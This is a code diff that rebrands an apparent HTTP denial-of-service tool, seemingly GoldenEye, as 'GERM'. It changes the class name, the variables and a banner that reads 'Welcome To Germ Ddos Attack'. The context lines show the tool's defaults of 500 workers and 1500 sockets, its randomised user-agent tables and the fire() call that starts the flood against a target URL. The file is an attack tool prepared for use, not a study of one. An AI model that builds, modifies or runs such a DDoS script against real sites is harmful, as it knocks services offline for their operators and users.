@@ -32,7 +32,7 @@ JOIN_TIMEOUT=1.0
 DEFAULT_WORKERS=500
 DEFAULT_SOCKETS=1500
 
-GOLDENEYE_BANNER = 'Welcome To Germ Ddos Attack'
+GERM_BANNER = 'Welcome To Germ Ddos Attack'
 
 USER_AGENT_PARTS = {
     'os': {
@@ -71,10 +71,10 @@ USER_AGENT_PARTS = {
 }
 
 ####
-# GoldenEye Class
+# GERM Class
 ####
 
-class GoldenEye(object):
+class GERM(object):
 
     # Counters
     counter = [0, 0]
@@ -116,7 +116,7 @@ class GoldenEye(object):
 
         # Taunt!
         print
-        print GOLDENEYE_BANNER
+        print GERM_BANNER
         print
 
     # Do the fun!
@@ -590,13 +590,13 @@ def main():
             except EnvironmentError:
                     error("cannot read file {0}".format(uas_file))
 
-        goldeneye = GoldenEye(url)
-        goldeneye.useragents = useragents
-        goldeneye.nr_workers = workers
-        goldeneye.method = method
-        goldeneye.nr_sockets = socks
+        GERM = GERM(url)
+        GERM.useragents = useragents
+        GERM.nr_workers = workers
+        GERM.method = method
+        GERM.nr_sockets = socks
 
-        goldeneye.fire()
+        GERM.fire()
 
     except getopt.GetoptError, err:
 
